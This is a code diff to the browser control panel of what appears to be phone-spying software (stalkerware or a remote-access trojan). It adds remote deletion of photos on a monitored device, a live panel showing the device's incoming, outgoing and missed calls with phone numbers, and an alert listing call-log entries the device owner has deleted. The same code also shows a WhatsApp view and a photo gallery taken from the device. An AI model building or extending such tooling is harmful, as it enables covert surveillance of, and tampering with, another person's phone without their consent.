@@ -521,9 +521,20 @@ function updateGalleryGrid() {
       '<div class="gallery-actions">' +
         '<button class="btn-icon" title="View Full Size" onclick="event.stopPropagation(); viewFullPhoto(' + JSON.stringify(photo).replace(/"/g, '&quot;') + ')">🔍</button>' +
         '<button class="btn-icon" title="Download" onclick="event.stopPropagation(); downloadGalleryPhoto(' + photo.id + ', \'' + escapeHtml(photo.name) + '\')">⬇️</button>' +
+        '<button class="btn-icon btn-delete" title="Delete Photo" onclick="event.stopPropagation(); deletePhoto(' + photo.id + ', \'' + escapeHtml(photo.path || '') + '\', this)" style="color:#ef4444">🗑️</button>' +
       '</div>';
     grid.appendChild(item);
   });
+}
+
+function deletePhoto(photoId, photoPath, btn) {
+  if (!confirm('Kya aap ye photo permanently delete karna chahte ho?')) return;
+  var deviceId = getSelectedGalleryDevice();
+  if (!deviceId) { showToast('Device select karein', 'error'); return; }
+  socket.emit('command:photo:delete', { deviceId: deviceId, photoId: photoId, path: photoPath });
+  btn.disabled = true;
+  btn.textContent = '...';
+  showToast('Deleting photo...', 'info');
 }
 
 function viewFullPhoto(photo) {
@@ -1154,22 +1165,44 @@ function updateWhatsappGrid() {
 socket.on('call:live', function(data) {
   var icon = '📞';
   var msg = '';
+  var panelColor = '#334155';
   if (data.state === 'ringing') {
     icon = '📲';
     msg = 'INCOMING CALL from ' + (data.number || 'Unknown');
+    panelColor = '#065f46';
   } else if (data.state === 'answered') {
     icon = '📱';
     msg = (data.type === 'outgoing' ? 'OUTGOING' : 'INCOMING') + ' call answered: ' + (data.number || 'Unknown');
+    panelColor = '#1e40af';
   } else if (data.state === 'ended') {
     if (data.type === 'missed') {
       icon = '📵';
       msg = 'MISSED CALL from ' + (data.number || 'Unknown');
+      panelColor = '#991b1b';
     } else {
       icon = '📴';
       msg = 'Call ended (' + data.type + '): ' + (data.number || 'Unknown');
+      panelColor = '#334155';
     }
   }
   showToast(icon + ' ' + msg, data.type === 'missed' ? 'error' : 'info');
+
+  // Update Live Call Panel UI
+  var panel = document.getElementById('liveCallPanel');
+  var infoEl = document.getElementById('liveCallInfo');
+  var timeEl = document.getElementById('liveCallTime');
+  var iconEl = document.getElementById('liveCallIcon');
+  if (panel && infoEl) {
+    panel.style.display = 'block';
+    panel.style.borderColor = panelColor;
+    iconEl.textContent = icon;
+    infoEl.textContent = msg;
+    timeEl.textContent = data.timestamp ? new Date(data.timestamp).toLocaleString() : '';
+    // Auto-hide ended calls after 10s
+    if (data.state === 'ended') {
+      setTimeout(function() { panel.style.display = 'none'; }, 10000);
+    }
+  }
 
   // Add to call log data if on that page
   if (data.state === 'ended') {
@@ -1190,25 +1223,40 @@ socket.on('calllog:deleted', function(data) {
   var msg = '⚠️ ALERT: ' + count + ' call log entries DELETED on device!';
   showToast(msg, 'error');
 
+  // Update Deleted Calls Panel
+  var panel = document.getElementById('deletedCallsPanel');
+  var infoEl = document.getElementById('deletedCallsInfo');
+  var listEl = document.getElementById('deletedCallsList');
+  if (panel && infoEl) {
+    panel.style.display = 'block';
+    infoEl.textContent = count + ' call log entries deleted at ' + new Date(data.timestamp).toLocaleString();
+
+    if (data.deletedEntries && data.deletedEntries.length > 0 && listEl) {
+      var html = '<strong>Deleted entries:</strong><br>';
+      data.deletedEntries.forEach(function(entry) {
+        var time = entry.timestamp ? new Date(entry.timestamp).toLocaleString() : '';
+        html += '• ' + (entry.name || entry.number || 'Unknown') + (time ? ' (' + time + ')' : '') + '<br>';
+      });
+      listEl.innerHTML = html;
+    }
+  }
+
   // Show deleted entries if available
   if (data.deletedEntries && data.deletedEntries.length > 0) {
-    var details = 'Deleted entries:\\n';
-    data.deletedEntries.forEach(function(entry) {
-      var time = entry.timestamp ? new Date(entry.timestamp).toLocaleString() : '';
-      details += '- ' + (entry.name || entry.number || 'Unknown') + ' (' + time + ')\\n';
-    });
-    console.log(details);
-    // Show alert with details
-    setTimeout(function() {
-      showToast('Deleted: ' + data.deletedEntries.map(function(e) { return e.number || 'Unknown'; }).join(', '), 'error');
-    }, 3000);
+    console.log('Call log deleted entries:', data.deletedEntries);
   }
 });
 
 // ============ PHOTO DELETE ============
 socket.on('photo:deleted', function(data) {
   if (data.success) {
-    showToast('Photo deleted successfully', 'success');
+    showToast('Photo deleted successfully!', 'success');
+    // Remove from gallery
+    galleryPhotos = galleryPhotos.filter(function(p) {
+      return p.id !== data.photoId && p.path !== data.path;
+    });
+    updateGalleryGrid();
+    document.getElementById('galleryCount').textContent = galleryPhotos.length + ' photos';
   } else {
     showToast('Failed to delete photo: ' + (data.error || ''), 'error');
   }
